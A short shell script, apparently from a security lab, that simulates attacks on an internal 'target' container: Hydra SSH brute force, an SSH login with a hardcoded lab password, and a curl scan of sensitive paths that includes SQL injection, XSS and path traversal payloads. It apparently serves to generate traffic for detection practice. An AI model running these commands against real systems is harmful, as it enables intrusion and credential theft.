#!/bin/sh
# 랩 내부 target 컨테이너만 대상으로 하는 공격 시뮬레이터.
set -eu

TARGET="${TARGET:-target}"
LAB_USER="${LAB_USER:-labuser}"
LAB_PASSWORD="${LAB_PASSWORD:-summer2026}"

ssh_brute() {
  echo "[*] SSH brute force -> $TARGET"
  hydra -L /opt/lab/users.txt -P /opt/lab/passwords.txt -t 4 -I "ssh://$TARGET" || true
}

ssh_login() {
  echo "[*] 정상 SSH 로그인 -> $LAB_USER@$TARGET"
  sshpass -p "$LAB_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    "$LAB_USER@$TARGET" 'id; hostname'
}

web_scan() {
  echo "[*] 웹 민감 경로 스캔 -> http://$TARGET"
  for path in / /.env /.git/config /wp-login.php /wp-admin/ /phpmyadmin/ /admin/ /backup.zip \
              /server-status /config.php /.aws/credentials /api/v1/users /actuator/env \
              /cgi-bin/test.cgi /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \
              "/index.html?id=1'%20OR%20'1'='1" "/search?q=<script>alert(1)</script>" \
              "/download?file=../../../../etc/passwd"; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -A 'Mozilla/5.0 (lab-scanner)' "http://$TARGET$path" || echo ERR)
    echo "    $code $path"
  done
}

case "${1:-all}" in
  ssh-brute) ssh_brute ;;
  ssh-login) ssh_login ;;
  web-scan)  web_scan ;;
  all)       web_scan; ssh_brute; ssh_login ;;
  *) echo "usage: attack [ssh-brute|ssh-login|web-scan|all]" >&2; exit 2 ;;
esac
